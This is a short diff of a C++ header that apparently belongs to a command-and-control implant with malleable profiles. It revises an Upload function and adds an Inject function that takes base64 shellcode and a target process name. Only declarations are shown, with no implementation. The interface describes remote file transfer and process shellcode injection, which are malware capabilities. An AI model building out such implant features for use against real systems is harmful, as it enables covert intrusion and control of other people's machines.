@@ -28,8 +28,10 @@ std::string SysInfo();
 */
 void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile);
 
-std::string Upload(rapidjson::Value* uploaded);
+std::string Upload(std::string fileName, std::string b64Contents);
 
 std::string Download(std::string filepath);
+
+std::string Inject(std::string b64shellcode, std::string processName);
 
 #endif
